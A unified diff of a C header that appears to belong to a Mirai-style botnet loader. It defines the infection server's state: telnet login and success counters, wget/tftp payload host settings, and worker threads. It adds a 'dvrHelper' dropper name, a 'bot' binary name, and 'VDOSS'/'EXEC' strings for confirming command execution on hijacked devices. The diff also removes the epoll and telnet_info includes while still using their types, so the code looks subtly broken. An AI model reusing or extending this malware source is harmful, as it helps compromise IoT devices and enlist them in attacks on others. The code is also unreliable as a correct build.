@@ -1,38 +1,52 @@
 #pragma once
 
-#include <sys/epoll.h>
 #include "includes.h"
-#include "telnet_info.h"
 #include "connection.h"
 
+#define FN_DROPPER "dvrHelper"
+#define FN_BINARY "bot"
+
+#define TOKEN_QUERY "echo -n \"VDOSS\""
+#define TOKEN_RESPONSE "VDOSS"
+#define VERIFY_STRING_HEX "\\x56\\x44\\x4F\\x53\\x53"
+#define VERIFY_STRING_CHECK "VDOSS"
+#define EXEC_QUERY "echo -n \"EXEC\""
+#define EXEC_RESPONSE "EXEC"
+
 struct server {
-    uint32_t max_open;
-    volatile uint32_t curr_open;
-    volatile uint32_t total_input, total_logins, total_echoes, total_wgets, total_tftps, total_successes, total_failures;
-    char *wget_host_ip, *tftp_host_ip;
-    struct server_worker *workers;
-    struct connection **estab_conns;
     ipv4_t *bind_addrs;
-    pthread_t to_thrd;
+    uint8_t bind_addrs_len;
+    uint32_t max_open;
+    uint32_t curr_open;
+    uint32_t total_input;
+    uint32_t total_logins;
+    uint32_t total_successes;
+    uint32_t total_failures;
+    uint32_t total_echoes;
+    uint32_t total_wgets;
+    uint32_t total_tftps;
+    uint32_t curr_worker_child;
+    char *wget_host_ip;
     port_t wget_host_port;
-    uint8_t workers_len, bind_addrs_len;
-    int curr_worker_child;
+    char *tftp_host_ip;
+    struct connection **estab_conns;
+    struct server_worker *workers;
+    int workers_len;
+    pthread_t to_thrd;
 };
 
 struct server_worker {
     struct server *srv;
-    int efd; // We create a separate epoll context per thread so thread safety isn't our problem
+    int efd;
+    int thread_id;
     pthread_t thread;
-    uint8_t thread_id;
 };
 
-struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip);
-void server_destroy(struct server *srv);
-void server_queue_telnet(struct server *srv, struct telnet_info *info);
-void server_telnet_probe(struct server *srv, struct telnet_info *info);
- 
-static void bind_core(int core);
-static void *worker(void *arg);
-static void handle_output_buffers(struct server_worker *);
-static void handle_event(struct server_worker *wrker, struct epoll_event *ev);
+struct server *server_create(uint8_t, uint8_t, ipv4_t *, uint32_t, char *, port_t, char *);
+void server_destroy(struct server *);
+void server_queue_telnet(struct server *, struct telnet_info *);
+void server_telnet_probe(struct server *, struct telnet_info *);
+static void bind_core(int);
+static void *worker(void *);
+static void handle_event(struct server_worker *, struct epoll_event *);
 static void *timeout_thread(void *);
